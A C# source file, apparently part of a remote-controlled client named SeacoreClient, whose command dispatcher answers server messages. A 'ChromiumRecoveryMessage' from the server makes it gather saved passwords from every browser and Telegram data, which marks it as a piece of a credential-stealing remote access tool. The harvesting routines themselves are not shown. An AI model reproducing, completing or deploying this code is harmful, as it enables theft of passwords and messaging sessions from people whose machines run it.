using SeacoreClient.Features.Recovery.Messenger.Telegram;
using SeacoreClient.Features.Recovery.Browsers;
using SeacoreCommon.Messages;
using SeacoreClient.Core;

namespace SeacoreClient.Handlers
{
    public static class MessageHandler
    {
        public static void ProcessMessage(MessageBase message, TcpClientManager clientManager)
        {
            switch (message)
            {
                case HeartbeatAckMessage ackMessage:
                    clientManager.HeartbeatSender?.HandleHeartbeatAck(ackMessage.ServerTimestamp);
                    break;

                case DisconnectMessage:
                    clientManager.HandleServerInitiatedDisconnect();
                    break;

                case ReconnectMessage:
                    Console.WriteLine("Reconnect command received.");
                    clientManager.RunAsync().Wait();
                    break;

                case ChromiumRecoveryMessage:
                    BrowserRecoveryManager.RecoverPasswordsForAllBrowsers();
                    TelegramRecovery.Telegram();
                    break;

                default:
                    Console.WriteLine("Received unknown message.");
                    break;
            }
        }
    }
}
